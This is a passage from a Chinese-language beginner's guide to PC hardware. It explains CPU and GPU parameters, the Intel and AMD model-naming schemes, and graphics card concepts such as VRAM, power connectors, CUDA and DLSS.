&lt;p>内存本质上也是存储器的一种，用于存储信息，但是内存是断电后数据就会丢失的。内存的出现是因为处理器速度很快，硬盘的读取速度又太低，于是需要内存作为缓存，内存先将需要的数据从硬盘读取好，方便 cpu 随时索取。一个形象的比喻，计算机中硬盘是一口井，数据是其中的水。CPU想要读取数据的时候是需要用一个桶（也就是内存）去井（硬盘）中取水。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>显卡（GPU，Graphics Processing Unit）&lt;/p>
&lt;p>显卡可以理解为专门处理图形化信息的 CPU,其负责图形信息的运算处理，并将其提供给显示设备显示。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>硬盘（HD,Hard Disk)&lt;/p>
&lt;p>硬盘，有一个存储器，其和内存的区别即在于断电后数据依旧可以存在，是计算机中存储数据最常见的方式。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>电源&lt;/p>
&lt;p>顾名思义，提供计算机运行所需要的电源。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>散热器&lt;/p>
&lt;p>这里散热器将各类 CPU 散热器，机箱风扇，亦或是各类水冷归类到一起。为了保证运行中的高温设备有效散热，保障系统稳定运行。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>接下来将会介绍各个硬件设备的基础品牌，参数，型号等等知识点。先从篇幅较大且直接影响性能的 CPU,GPU 开始。&lt;/p>
&lt;h2 id="中央处理器cpu">中央处理器（CPU）&lt;/h2>
&lt;p>中央处理器，又叫中央处理单元，（CPU, Central Processing Unit）。常用的电脑处理器均来自两家厂商：Intel（英特尔），AMD。当然中国也有自己的自研处理器龙芯，不过这里不多介绍。&lt;/p>
&lt;p>Intel 是目前唯一同时具有处理器设计制造一条流水线的厂商，其具备研发，设计，制造，拥有自己的晶圆厂商。&lt;/p>
&lt;p>AMD 则是自己研发设计，将制造工作交给了台积电之类的企业。&lt;/p>
&lt;h3 id="处理器常见参数名词详解">处理器常见参数名词详解&lt;/h3>
&lt;h4 id="核心数目">核心数目&lt;/h4>
&lt;p>指的是处理器所拥有的处理器核心数目，现有处理器一般为多核心的设计（多核心的设计实现了任务的并行处理）一般核心数目为 1,2,4,8 等二的几次方的数量。值得一提的是在 intel 12 代及后来版本的处理器中引入了大小核心的概念，即一个处理器有几个强力核心（P-core,Performance-cores）和几个能效核心(E-core,Efficient-cores)，大核负责干累活，小核负责打杂。&lt;/p>
&lt;h4 id="线程数目">线程数目&lt;/h4>
&lt;p>线程是计算机软件在系统中的最小调度单元，一般一个核心对应一个线程。但是随着超线程技术的出现，使得一个核心可以拥有两个线程。&lt;/p>
&lt;p>在了解完核心数目和线程数目的概念后既可以理解，双核四线程，以及四核八线程的概念了，即指一个处理器拥有两个处理核心，四个线程。&lt;/p>
&lt;p>这里再补充一个知识点，在 Intel 的大小核心的架构下，默认能小核心不具备超线程技术，所以就会有类似 10 核 12 线程（2 大核，8 小核心）这种不符合二进制规律的设计。&lt;/p>
&lt;ul>
&lt;li>同时简单解释一下超线程技术：在早期的时候一个物理核心只有一个线程，一次只能执行一个任务。但是芯片设计者发现执行一个任务的时候并不是所有时刻这个线程都是满载的，有时候程序需要去等待数据读取，等待用户操作等，于是这个线程就会暂时空闲。于是为了进一步压榨CPU的计算能力，超线程技术诞生。在计算机的物理线程进入等待状态（闲置状态）的时候，让其去执行另外一个线程。&lt;/li>
&lt;/ul>
&lt;h4 id="主频">主频&lt;/h4>
&lt;p>主频又叫 CPU 的时钟频率（CPU Clock Speed），默频，指的是处理器在一个时钟信号周期内完成很的操作次数。一定程度上能够反映 CPU 的处理能力强弱。不过只是一定程度上，cpu 的运算速度还和架构制程有着很大的关系，即同样主频的新旧两款处理器性能并不一样。&lt;/p>
&lt;h4 id="睿频加速频率">睿频（加速频率）&lt;/h4>
&lt;p>睿频是 Intel 公司研发的时钟频率自动加速技术，开启睿频时处理器将针对任务负载调整处理器频率，且将尝试提升处理器频率到一个超过默认频率的状态。因此 Intel 的处理器也就有了一个最大睿频的参数，即单一核心在特点定条件下能够达到的最大频率。AMD 也有其对应的加速技术。&lt;/p>
&lt;h4 id="缓存">缓存&lt;/h4>
&lt;p>之前说道内存与处理器和硬盘之间关系的时候提到，为了应对硬盘速度过低于是有了内存。但是哪怕是内存的速度相较于处理器还是太慢了，于是就有了 CPU 缓存，可以简单理解为集成在处理器中的比内存快很多的“内存”。一般针对处理器缓存只有一个简单的参数概念，那就是其大小。&lt;/p>
&lt;h4 id="功耗">功耗&lt;/h4>
&lt;p>功耗即一款 CPU 以满载运行时所所需要的功率。以我们常规的瓦 W 为单位&lt;/p>
&lt;h4 id="tdp-热功耗">TDP 热功耗&lt;/h4>
&lt;p>TDP 热功耗，又叫“热量设计功耗”，指处理器在满载的情况下所释放的热量，是评判一个处理器发热量的指标。一般依据这个指标去给处理器选择合适的散热器。&lt;strong>值得注意提的是 TDP 并不等于功耗，也没有直接的算术关系，其仅作为指导散热器选择的指标&lt;/strong>，简单讲 TDP 65w 的设备可能实际满载运行的真实功耗远高于 65w。&lt;/p>
&lt;h4 id="架构">架构&lt;/h4>
&lt;p>处理器架构是 CPU 厂商给属于同一系列的 CPU 产品设立的一个规范，例如 Intel 的 Tigerlake（&lt;del>老虎湖&lt;/del>） 架构，AMD 的 zen 架构。是设计处理器的一种工业模式，一般情况下我们消费者无需太过关注其架构的实现细节，只需要指导架构的新旧，新的架构往往意味着更好性能和支持。&lt;/p>
&lt;h4 id="指令集">指令集&lt;/h4>
&lt;p>指令集架构，是 CPU 中用来计算和控制计算机的一套指令集合，是一种标准。市面上常见的指令集架构如下：&lt;/p>
&lt;ul>
&lt;li>x86&lt;/li>
&lt;li>ARM&lt;/li>
&lt;li>RISC&lt;/li>
&lt;li>...&lt;/li>
&lt;/ul>
&lt;p>常规个人电脑或者服务器一般多用 x86 架构（intel 与 AMD 生产的处理器也大多采用这个架构），ARM 架构则多为移动设备采用，例如手机，平板的电脑等，知名的生产厂商例如：苹果的 A 系列芯片，M 系列，以及高通骁龙系列。RISC 则是高性能 CPU 的例如超算发展方向。&lt;/p>
&lt;h4 id="32-位64-位">32 位/64 位&lt;/h4>
&lt;p>32 位和 64 位，本质上是计算机操作系统的所支持的存储器地址范围，通俗的讲，32 位的系统仅仅支持 4GiB（实际约为 3.8G）的内存大小。而 64 位理论上支持 16EB（17179869184GB）的内存。实际目前操作系统支持的内存大小还停留在 TB（1024G）层次。&lt;/p>
&lt;p>简单总结，超过 4G 内存的电脑设备推荐使用 64 位的操作系统，同样也要支持 64 位的 CPU 才可以安装 64 位的操作系统。不过目前市面上多数的 CPU 都是支持 64 位系统的。&lt;/p>
&lt;h4 id="超频">超频&lt;/h4>
&lt;p>超频是一个不仅仅属于 CPU 的概念。之前提到 CPU 有主频， 有睿频，但无论哪都是厂商经过测试规定好的。而超频指的是用户拿到处理器，通过修改供电参数，修改核心参数等手段时使得处理器运行在一个超过厂商设定的频率的行为。当然超频行为不仅仅局限于处理器，凡是拥有频率参数的设备都可以通过超频这一手段获取额外的性能（其他有频率参数的设备例如：内存，显卡等）。当然超频本身对硬件可能会带来损伤，具有潜在风险。&lt;/p>
&lt;h4 id="制程">制程&lt;/h4>
&lt;p>制程指的是处理器在制造过程中所使用的”制作工艺“，用来衡量集成电路的制作精细度，一般以纳米 nm 为单位。可以理解为在硅片上雕刻的刻刀的大小，刻刀越小，单位面积内所能雕刻的电路也就越多，处理器性能也就越强悍。同时也会带来功耗减小的提升。&lt;/p>
&lt;p>但是现有厂商也很鸡贼开始不再使用 nm 为单位，而是转而给自己的刻刀起一个新的名字，例如 intel 在 12 代处理器后就将所采用的 10nm 工艺称为 intel 7 工艺，而将 7nm 工艺称为 intel 4。这本质上只是文字游戏。&lt;/p>
&lt;p>当然哪怕相同的 10nm 工艺，不同晶圆厂商制造出来的集成电路密度也不一致。同时制成有和处理器架构名称有一定关联，即部分架构可能采取的是一种制程，而新架构采取的是更加优秀的制程。&lt;/p>
&lt;h4 id="核显">核显&lt;/h4>
&lt;p>核心显卡，又叫核显，集成显卡。区别于独立显卡，ta 直接被封装在处理器中，拥有核显的 CPU 可以不需要安装独立显卡即可连接显示设备输出画面。&lt;/p>
&lt;h4 id="主板插槽芯片组">主板插槽/芯片组&lt;/h4>
&lt;p>不论是 AMD 还是 Intel 生产的 CPU，不同代的 cpu 所使用到的 cpu 主板插槽是不同的，同时因为 cpu 代数的不同还带来的主板芯片组的不同。常见的 intel 插槽有例如 LGA 系列插槽，和 amd 的 AM 系列插槽。同时插槽本身也有版本对应不同的代的处理器。例如 LGA 1700 对应酷睿 12 代的处理器，其支持这一插槽的主板芯片组有高端的 Z690 芯片组，中端的 B660 芯片组，低端的 H610 芯片组。&lt;/p>
&lt;h3 id="intel-处理器命名规则">Intel 处理器命名规则&lt;/h3>
&lt;p>消费级即指面向普通个人用户的产品。企业级即指产品面向企业用户，多用于服务器领域。&lt;/p>
&lt;p>Intel 将处理器分为如下几个系列：奔腾系列，赛扬系列，酷睿系列，至强系列，凌动系列。这里只介绍消费级最常见的酷睿系列，以及简单介绍企业级的至强系列的命名规则。但除开命名规则，在你了解各种参数背后的意义后都可以前去 intel 官网查看每款处理器的参数从而了解处理器的性能。&lt;/p>
&lt;h4 id="酷睿系列">酷睿系列&lt;/h4>
&lt;p>酷睿分为 i3,i5,i7,i9 四个产品。以“intel Core i9-12900k”为例，&lt;/p>
&lt;ul>
&lt;li>
&lt;p>intel 指的是厂商&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Core 指的是酷睿系列&lt;/p>
&lt;/li>
&lt;li>
&lt;p>i9 指的是产品名&lt;/p>
&lt;/li>
&lt;li>
&lt;p>12900k 指的是型号，其中包括版本（代）数，和具体型号等参数&lt;/p>
&lt;ul>
&lt;li>12 代表十二代处理器&lt;/li>
&lt;li>900 代表具体型号，一般越高代表主频越高，核心数越多，性能越强。&lt;/li>
&lt;li>字母后缀则表示附加特性，例如 K 表示处理器可超频，下标为常见字母后缀含义
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>后缀&lt;/th>
&lt;th>含义&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>B&lt;/td>
&lt;td>这一后缀为一体机采用,cpu 多数直接采用封装工艺焊接在主板上，例如 i5-8500B&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>C&lt;/td>
&lt;td>这一后缀只在 5 代 CPU 上出现过，代表该 CPU 拥有当时最强核显，例如 i7-5775C&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>G&lt;/td>
&lt;td>带 G 后传系列为 Kaby Lake 架构的处理器，为 intel 和 amd 合作产品，CPU 由 intel 负责，核显则由 amd 提供，例如：i7-8809G&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>H&lt;/td>
&lt;td>在八代以前，H 代表 bga 焊接封装（类似笔记本电脑 cpu 焊接在主板上无法更换），八代开始 H 不仅仅意味着 bga 封装，也意味着 6 核心（Hexagon），同时不具备超线程工艺，例如 i3-8100H&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>HK&lt;/td>
&lt;td>这类产品在上面的 H 后缀处理器中加上了可超频属性，即笔记本设备处理器可超频，例如：i9-8950HK&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>HQ&lt;/td>
&lt;td>四代 CPU 中出现过的后缀，例如 i7 4700HQ&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>K&lt;/td>
&lt;td>代表可超频&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>M&lt;/td>
&lt;td>代表双核移动版（笔记本设备）处理器，四代后很少采用，例如 i5-4310M&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>R&lt;/td>
&lt;td>和 B 类似的移动版（笔记本设备）处理器，例如 i7-5775R&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>T&lt;/td>
&lt;td>低压桌面处理器（台式机设备），功耗和性能都低于不带后缀的版本，多用于一体机，工控设备等，例如 i7-8700T&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>U&lt;/td>
&lt;td>低压版移动处理器，被用在各类超薄本，轻薄本上，例如 i7-8550U&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>X/XE&lt;/td>
&lt;td>最高性能版本，例如 i9-10980XE&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Y&lt;/td>
&lt;td>比 M 后缀还早的处理器产品，超低压移动处理器，后续被 M 替代，例如 i3-3229Y&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>F&lt;/td>
&lt;td>指不带核显的版本,需要安装独立显卡&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h4 id="至强系列">至强系列&lt;/h4>
&lt;p>相较于消费级的处理器，至强系列主要服务于服务器领域，因而其主频参数相较而言更低，但是其核心数目要更多。目前 intel 将至强系列分为：Platinum 铂金，Gold 金牌，Silver 银牌，Bronze 铜牌。过去 intel 将至强系列分为 E7,E5,E3。&lt;/p>
&lt;p>至强系列现阶段采用四位数字型号。&lt;/p>
&lt;ul>
&lt;li>第一位数字代表处理器级别：
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>数字&lt;/th>
&lt;th>级别&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>9/8&lt;/td>
&lt;td>铂金&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>6/5&lt;/td>
&lt;td>黄金&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4&lt;/td>
&lt;td>银&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>铜&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;li>第二位代表处理器代次&lt;/li>
&lt;li>第三位和第四位布局为特定功能，一般而言越强的处理器第三第四位越大&lt;/li>
&lt;/ul>
&lt;h3 id="amd-处理器命名规则">AMD 处理器命名规则&lt;/h3>
&lt;p>AMD 的产品同样分为消费级的锐龙（Ryzen）系列，和服务器的 EPYC 系列。&lt;/p>
&lt;h4 id="锐龙系列-ryzen">锐龙系列 Ryzen&lt;/h4>
&lt;p>以 AMD Ryzen 7 5700X 为例：&lt;/p>
&lt;ul>
&lt;li>AMD 代表厂商 AMD&lt;/li>
&lt;li>Ryzen7 代表产品系列 r7，锐龙有 r3,r5,r7,r9 四个系列，性能逐级递升。&lt;/li>
&lt;li>5700X 代表产品代数和型号等信息
&lt;ul>
&lt;li>第一位 5 表示产品代数，第五代&lt;/li>
&lt;li>第二到第四位则是编号越大性能越强&lt;/li>
&lt;li>字母后缀 X 表示可超频，支持 AMD 官方的 XFR 技术。AMD 的字母后缀含义如下表
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>后缀&lt;/th>
&lt;th>含义&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>X&lt;/td>
&lt;td>支持超频即支持 AMD 官方的 XFR 超频技术&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>G&lt;/td>
&lt;td>代表具有核心显卡&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3D&lt;/td>
&lt;td>代表具有 3D 缓存技术（一种使得处理器具有更大缓存的技术，可以显著提升处理器能力）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>WX&lt;/td>
&lt;td>代表最新的超多线程系列，即 AMD 的线程撕裂者系列&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>PRO&lt;/td>
&lt;td>支持一些特别的数据安全技术&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>U&lt;/td>
&lt;td>移动端面向笔记本轻薄本的 CPU,有较低功耗以及具有核显&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>H&lt;/td>
&lt;td>标准电压的移动端处理器，相较于 U 系列性能更强，且同样具有核显&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h4 id="amd-epyc-系列">AMD EPYC 系列&lt;/h4>
&lt;p>以 AMD EPYC 7443P 为例&lt;/p>
&lt;ul>
&lt;li>EPYC 产品系列&lt;/li>
&lt;li>7443P 产品型号等参数
&lt;ul>
&lt;li>第一位 7 代表 7000 系列&lt;/li>
&lt;li>第二位则与核心数有关
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>数字&lt;/th>
&lt;th>核心数目&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>0&lt;/td>
&lt;td>8&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>16&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>24&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>32&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4&lt;/td>
&lt;td>48&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>5&lt;/td>
&lt;td>64&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>6&lt;/td>
&lt;td>84-96&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;li>第三位代表性能相关，数字越大核心性能越高。&lt;/li>
&lt;li>第四位代表版本，可以是 1,2,3,4&lt;/li>
&lt;li>字母后缀 P 代表单插槽，即一个主板只可以安装一个处理器，F 则表示更高性能。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="命名规则总结">命名规则总结&lt;/h3>
&lt;p>命名规则其实是厂商一件很随意的事情，很有可能换代新的产品后就会启用一套心得命名规则，或者对旧有的命名规则进行修改。同时也偶尔会有完全不符合命名规则的产品出现。总之命名规则只是为了方便普通用户选择认识产品（所以也可以看到企业级有时候命名规则并不清晰，因为叫什么并不重要），最根本的还是一款处理器的参数，从参数认识产品，才是本质。&lt;/p>
&lt;h2 id="显卡gpu">显卡（GPU）&lt;/h2>
&lt;p>这里的显卡我们仅讨论独立显卡，即不包括之前有关核心显卡的相关内容。不过多数参数名词二者是通用的。&lt;/p>
&lt;p>目前世界上独立显卡的制造商有英伟达（Nvidia），AMD,英特尔（Intel），以及国内的摩尔线程。但由于 Intel 以及摩尔线程的独立显卡刚刚起步，因此这里不做讨论。&lt;/p>
&lt;h3 id="常见显卡参数名词详解">常见显卡参数名词详解&lt;/h3>
&lt;h4 id="显卡核心">显卡核心&lt;/h4>
&lt;p>显卡核心，即显卡芯片，因为厂商的不同芯片实际可能也不同。其内部结构以及性能也差距很大。一般我们通过&lt;a href="https://www.mydrivers.com/zhuanti/tianti/gpu/index.html">显卡天梯图&lt;/a>来判断核心强弱。显卡核心可以理解为一个近似 CPU 的存在，不过其被设计为更多的为了处理图形数据。&lt;/p>
&lt;p>显卡核心同样有着自己的架构，制程，代号名称，这些更加细节的参数需要根据具体型号前往对应官网查询。&lt;/p>
&lt;p>显卡的性能受到显卡核心型号，核心频率，显存大小，显存频率，显存位宽多方面制约。&lt;/p>
&lt;p>&lt;img src="./images5.jpeg" alt="">&lt;/p>
&lt;h4 id="显卡核心制程">显卡核心制程&lt;/h4>
&lt;p>同 CPU 谈到的制程一样，纳米 nm 为单位。目前最新工艺 5nm&lt;/p>
&lt;h4 id="核心频率">核心频率&lt;/h4>
&lt;p>核心频率，即显卡核心的工作频率，一定程度上可以反应核心的性能。
显卡核心也具有频率，也可以实现超频。&lt;/p>
&lt;h4 id="显存">显存&lt;/h4>
&lt;p>显存，顾名思义，显卡所用到内存。显存容量决定显卡能够临时存储数据的能力，一般而言越大越好。&lt;/p>
&lt;h4 id="显存类型">显存类型&lt;/h4>
&lt;p>显存可按照其制造工艺名称分为 GDDR3,GDDR4，GDDR5,GDDR6,GDDR6X...等等，数字代表的是版本代数，X 代表加强。另外，核心显卡也具有显存，不过核心显卡的显存是直接共享的电脑内存。当然独立显卡也会使用一部分电脑内存作为显存，不过使用电脑内存作为显存的方式终究比不过专业显存。&lt;/p>
&lt;h4 id="显存频率">显存频率&lt;/h4>
&lt;p>显存的工作频率，同时显存也可以超频。&lt;/p>
&lt;h4 id="显存位宽">显存位宽&lt;/h4>
&lt;p>可以把显存位宽比作高速公路的路宽，显存只是一个存储数据的仓库，频率代表其单位时间内数据可以处理进出仓库速度，但是真正要把数据送进来和送出去则依靠显存位宽，也就是道路的宽度。所以容量和频率在大，但是位宽不够也会导致性能较低。&lt;/p>
&lt;h4 id="显卡接口视频给输出口">显卡接口（视频给输出口）&lt;/h4>
&lt;p>显卡接口即显卡视频输出口，连接显示器等输出设备的接口类型。注意，并不是所有显卡都有视频输出口，部分专业计算卡因为只需要负责计算，并没有输出视频的需求所以在设计制造的时候并不会留有视频输出口。&lt;/p>
&lt;p>常见的显卡视频输出口有，较老的 DVI,VGA,以及目前主流标准的 HDMI,DP 以及未来可能会流行的 type c 口。同时由于输出口的不同，其所采取的软件协议也有可能不同，例如 HDMI 口有专门的 HDMI 协议，包括 HDMI1.0,2.0 等。同样 DP 也有的对应的 DP 协议，包括 DP1.2,DP1.4 等。&lt;/p>
&lt;p>下图中即显卡的视频输出口，其从上往下分别是 DP,HDMI,DP,HDMI。&lt;/p>
&lt;p>&lt;img src="./images4.jpeg" alt="">&lt;/p>
&lt;h4 id="显卡插槽及协议">显卡插槽及协议&lt;/h4>
&lt;p>显卡与主板连接的插槽目前主流是 PCI-E 插槽，插槽的长度有直接决定传输位宽，一般显卡使用的是 PCI-E x16 的规格。同时显卡插槽采用的协议是 PCIE 协议，目前最新的协议是 PCIE5.0，多数显卡目前使用得到的是 PCIE4.0。插口类型，和协议类型并不一定是绑定关系。例如我们可以用 typec 接口来实现 pcie 协议的传输。&lt;/p>
&lt;p>&lt;strong>显卡上的 PCI-E 插口又被称为金手指，即金色的引脚部分&lt;/strong>&lt;/p>
&lt;p>&lt;img src="./images3.jpeg" alt="">&lt;/p>
&lt;h4 id="外接供电">外接供电&lt;/h4>
&lt;p>PCI-E 插槽本身是可以提供供电的，但由于高性能显卡高功耗，所以一般独立显卡会采用外接供电的形式（也有不需要外接供电的低功耗显卡）。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>供电规格&lt;/p>
&lt;p>外接供电一般有 4pin,6pin,8pin 这几种基础规格，最直观的就是看插孔数量。当然也有将不同规格 pin 的供电组合起来的形式，例如高端显卡会采用 3x8pin 的供电，即三个 8pin 供电，合计 24pin 供电。此外也有 4+6pin 供电的组合，或者双 8pin,双 6pin 的组合。&lt;/p>
&lt;p>另外，英伟达在其最新的 40 系列显卡中引入了 ATX3.0 的供电标准，其有全新设计的 16pin 供电接口（不同于上面所说的双 8pin 的 16pin 供电）。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>供电接口朝向&lt;/p>
&lt;p>显卡供电接口目前有两种朝向，一种是尾插，常见于各类涡轮显卡（多用于服务器的显卡，为了方便供电线材排布以及散热排布），另一种是常规的侧面插插口，位于显卡 pci-e 插口的对面。&lt;/p>
&lt;p>&lt;img src="./images.jpeg" alt="侧面插槽">&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h4 id="显卡厚度槽">显卡厚度/槽&lt;/h4>
&lt;p>显卡采用的是 PCI-E 插槽，而一个主板将会有多个 PCI-E 插槽，且其之是有间距的。当一张显卡的厚度太厚时会影响相邻插槽的显卡安装。因而在选择显卡时厚度会是一个很重要的参数。&lt;/p>
&lt;p>电脑机箱的 PCI-E 插槽厚度有其相应的的标准，一般一个槽的宽度标准是&lt;strong>20.32mm(2.032cm)&lt;/strong>。当然可以直接约等于 2cm 。&lt;/p>
&lt;p>显卡槽数以占用的 PCI-E 插槽槽口计算，占用一个槽宽即单槽卡，两个为双槽卡，此外还有三槽卡,例如下图。可以看得到明显的右侧三个突出。&lt;/p>
&lt;p>&lt;img src="./iamges1.jpeg" alt="">&lt;/p>
&lt;p>但有时候我们描述显卡厚度的时候也会使用槽这个单位，例如 2.5 槽卡这样的描述，即按照 PCI-E 标准单槽厚度，2.5 槽即意味着该卡厚度为 2.5x2cm 即 5cm。但是要注意的一点是：&lt;strong>显卡厚度槽数目不等于占用槽数！！！&lt;/strong>，举个例子一个占用 3 槽的显卡，其真实厚度可能只有 2.5 槽 5cm。又或者，一个 2 槽的显卡可能厚度是 2.5 槽。&lt;/p>
&lt;h4 id="涡轮卡">涡轮卡&lt;/h4>
&lt;p>涡轮卡，又称作涡扇卡，区别于常规显卡的单风扇，双风扇，亦或是三风扇的设计，涡轮卡采用了具有涡轮增压效果的风扇以实现更好的散热更加优异的性能，同时更加小巧的体积（一般涡轮风扇等等显卡多为双槽的宽度，可以更加方便密集排布安装）。但是同时也带来了高噪音的缺点。因此一般涡轮风扇卡更多的被使用服务器上。&lt;/p>
&lt;p>&lt;img src="./images2.jpeg" alt="">&lt;/p>
&lt;h4 id="公版非公oem-版">公版/非公/oem 版&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>这里首先普及两个概念，“显卡厂商“这个概念一直是一个比较模糊的说法。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>显卡设计厂商：这里我们把有独立设计研发显卡芯片的厂商称之为显卡设计厂商，例如NVIDIA,AMD,Intel等&lt;/p>
&lt;/li>
&lt;li>
&lt;p>显卡生产厂商：这里指从显卡设计厂商那里购买显卡芯片，自己设计显卡外观，稍微改动供电规格等生产所谓他们自己平台的显卡。&lt;/p>
&lt;p>总结：我们常规说的，A卡，N卡指的是显卡设计厂商。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>公版显卡：指的是&lt;strong>显卡设计公司&lt;/strong>例如 AMD,或者 NVIDIA,自己制造生产出来的显卡，被称之为公版，其具有标准的性能以及较为具有辨识度的外观。常作为显卡设计公司对一代显卡的模板规范，其他显卡生产厂商依据这个模板制造新一代显卡。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>非公版显卡：指的是显卡设计公司将显卡核心卖给第三方合作厂商例如华硕，微星等，这些第三方合作厂商自己设计外观散热供电生产出来的显卡即为非公版显卡。非公版显卡区别于公版可能会有更加好的散热及供电，以及相较于公版更高的核心频率以及显存频率。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>oem 版本显卡：这类显卡指的是一些电脑生产商例如联想，戴尔，他们会采购显卡核心制造一些用于自己成品的电脑的显卡。一般这类显卡是不对外零售的，不过不排除有流出的零星产品或者是拆机硬件在市场上。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>显卡的公版非公版，oem 版和其是不是涡轮风扇显卡并不是绑定关系，即会有非公版的涡轮卡，也有公版的非涡扇卡。&lt;/strong>&lt;/p>
&lt;h3 id="nvidia-英伟达显卡">NVIDIA 英伟达显卡&lt;/h3>
&lt;p>英伟达显卡，其性能以及在很多领域方面的发展更为全面，除去常规的游戏，及视频工作，其在工业设计游戏制作，CG 渲染，深度学习方面有着诸多建树。&lt;/p>
&lt;h4 id="cuda">CUDA&lt;/h4>
&lt;p>CUDA（Compute Unified Device Architecture, 统一计算设备架构）是英伟达厂商推出的计算机平台和变成模型，其利用 GPU 的算力帮助解决复杂的计算问题，多用于机器学习，深度学习，视频渲染等工业领域。&lt;/p>
&lt;p>但不是所有设备都支持 CUDA,一般旗舰级别的显卡，例如 Geforce 系列或者计算卡都是支持的。&lt;/p>
&lt;p>在深度学习，机器学习相关方面，还有几个重要名词：Tensorflow, Pytorch 等，它们是一套深度学习框架，其可利用 NVIDIA GPU 的 CUDA 做到加速深度学习的。&lt;/p>
&lt;ul>
&lt;li>NLP（Natural Language Processing）自然语言处理。是指利用深度学习技术，让人工智能去理解人类自然语言的，并借此帮助解决问题的技术。&lt;/li>
&lt;li>CV （Computer Vision）计算机视觉。顾名思义，是指利用深度学习等技术让计算机去处理，理解图片，视频，音频等。例如实现识别图片内容，生成图片内容，图片优化等等。&lt;/li>
&lt;li>DL（Deep learning）深度学习。&lt;/li>
&lt;li>Tensorflow, Pytorch，这二者是一个基于python编程语言的深度学习开发框架，二者均支持NVIDIA CUDA加速运算。&lt;/li>
&lt;/ul>
&lt;p>对应的 AMD 也在积极研发类似 CUDA 的技术，但由于起步较晚，尚未成熟以及市场占有率的问题，成熟运用尚早。&lt;/p>
&lt;h4 id="dlss">DLSS&lt;/h4>
&lt;p>DLSS(Deep Learning Super Sampling，深度学习超级采样)（&lt;del>大力水手&lt;/del>）是一种 NVIDIA 研发的视频渲染技术，其使用神经网络提升画面流畅度。通俗的讲即通过牺牲一定程度的画面分辨率（清晰度）来提升画面流畅度（fps,帧率）。&lt;/p>
&lt;p>这一技术主要运用在个人电脑的游戏领域，目前 DLSS(&lt;del>大力水手&lt;/del>)有 1.0,2.0,3.0 三个版本，RTX20,30 系列显卡支持 DLSS2.0,DLSS3.0 目前仅在 40 系列得到支持。&lt;/p>
&lt;p>同样的技术 AMD FSR 也在积极研发，不过相较于 DLSS 依旧是起步较晚，不过 AMD 的 FSR 的技术不拘泥于硬件，即FSR技术并不一定要使用AMD的显卡，其他品牌显卡N卡等也可以使用该技术，这是其相较于 NVIDIA 的一个优势。&lt;/p>
&lt;h4 id="g-syncfreesync">G-Sync/FreeSync&lt;/h4>
&lt;p>自适应帧率同步技术，针对显示器的用于减少由于帧速率未对齐而导致的画面撕裂与延迟问题。&lt;/p>
&lt;p>FreeSync 由 AMD 开发，随后 Nvidia 开发了其的对应的 G-Sync。这一功能需要显卡以及显示器二者同时支持，且对视频输出口以及采用协议有关，目前多数仅支持 DP 接口 DP 协议。&lt;/p>
&lt;h4 id="nv-link">NV-LINK&lt;/h4>
